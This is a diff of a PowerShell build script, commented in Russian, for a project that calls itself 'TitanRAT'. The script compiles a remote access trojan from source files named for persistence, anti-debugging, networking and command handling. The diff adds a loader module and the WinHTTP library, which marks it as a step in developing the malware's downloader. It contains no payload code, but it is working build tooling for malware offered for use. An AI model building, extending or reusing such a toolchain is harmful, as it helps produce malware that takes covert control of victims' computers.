@@ -1,5 +1,5 @@
-# build.ps1 — Авто-поиск VS и сборка (Исправленная версия)
-# Запуск: Правый клик → "Run with PowerShell" или .\build.ps1
+# Core/build.ps1 — ФИНАЛЬНАЯ ВЕРСИЯ С LOADER (ЗАМЕНИТЬ ЦЕЛИКОМ)
+# build.ps1 — Авто-поиск VS и сборка
 
 $ErrorActionPreference = "Stop"
 Write-Host "[TitanRAT] Searching for Visual Studio..." -ForegroundColor Cyan
@@ -20,9 +20,10 @@ if (-not $vcVarsPath) {
 Write-Host "[+] Found: $vcVarsPath"
 Write-Host "[*] Initializing environment..."
 
-# 2. Вызываем vcvarsall.bat и запускаем компилятор в том же процессе cmd
-# ИСПРАВЛЕНО: добавлено /link перед флагами линкера, чтобы убрать warning D9002
-$cmd = "call `"$vcVarsPath`" && cl /nologo /EHsc /O2 main.cpp persistence.cpp anti_debug.cpp network.cpp commands.cpp /link /SUBSYSTEM:WINDOWS /OUT:core.exe kernel32.lib user32.lib advapi32.lib shell32.lib ole32.lib shlwapi.lib ws2_32.lib && echo [+] Build successful: core.exe || echo [!] Compilation failed"
+# 2. Компиляция с loader.cpp и winhttp.lib
+# /link отделяет флаги компилятора от флагов линкера
+$cmd = "call `"$vcVarsPath`" && cl /nologo /EHsc /O2 main.cpp persistence.cpp anti_debug.cpp network.cpp commands.cpp loader.cpp /link /SUBSYSTEM:WINDOWS /OUT:core.exe kernel32.lib user32.lib advapi32.lib shell32.lib ole32.lib shlwapi.lib ws2_32.lib winhttp.lib && echo [+] Build successful: core.exe || echo [!] Compilation failed"
+
 cmd /c $cmd
 
 if ($LASTEXITCODE -eq 0) {
